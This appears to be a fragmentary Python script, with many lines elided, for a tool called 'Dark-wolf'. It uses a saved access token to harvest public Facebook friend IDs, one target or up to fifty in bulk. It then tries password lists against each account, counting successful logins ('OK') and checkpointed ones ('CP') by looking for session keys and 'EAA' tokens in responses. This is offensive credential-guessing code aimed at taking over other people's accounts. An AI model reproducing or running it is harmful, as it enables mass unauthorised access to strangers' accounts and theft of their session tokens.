...
#--------------> MENU PILIHAN <--------------#
	def menu(self):
		...
		print("%s1. Dump public friend id"%(P))
		print("%s2. Dump bulk public id"%(P))
...
#--------------> DUMP PUBLIK TUNGGAL <--------------#
	def publik(self):
		...
		try:
			...
			print("%s>> Accumulated id : %s%s"%(P,H,str(len(self.id))))
			self.default()
		except requests.exceptions.ConnectionError:
			jalan(f"%s\n>> Problem connection ..."%(P));time.sleep(1);exit()
#--------------> DUMP PUBLIK MASSAL <--------------#
	def massal(self):
		try:
			token = open("token.txt","r").read()
		...
		if nambah<1 or nambah>50:
			jalan("%s>> Maximum %s50 id%s only"%(P,H,P));time.sleep(1);self.menu()
		ftv=0
		...
		for target in self.uid:
			try:
				...
				jalan("%s\n>> Target is not public ..."%(P));time.sleep(1);exit()
		try:
			print("\n%s>> Target name  : %s%s"%(P,H,search))
			print("%s>> Accumulated id : %s%s"%(P,H,str(len(self.id))))
			self.default()
...
#--------------> METHOD & PENGATURAN PASSWORD <--------------#
	def default(self):
		...
		if ask == "y" or ask == "Y" or ask == "ya" or ask == "YA":
			...
			print("%s>> Use the sign (,) for the separator"%(P))
			print("%s>> ------"%(P))
		...
		for pw in asw:
			try:
				...
				if "session_key" in post.text and "EAA" in post.text:
					...
					sys.stdout.write("\r%s[Dark-wolf]>> %s/%s - [OK:%s%s%s] [CP:%s%s%s] "%(P,loop,len(self.id),H,ok,P,K,cp,P), end=""),sys.stdout.flush()
					time.sleep(10)
				else:continue
			except ConnectionError:
				time.sleep(10)
		loop +=1
		sys.stdout.write("\r%s[Dark-wolf]>> %s/%s - [OK:%s%s%s] [CP:%s%s%s] "%(P,loop,len(self.id),H,ok,P,K,cp,P)),sys.stdout.flush()
#--------------> ATUR KATA SANDI <--------------#
	def password(self):
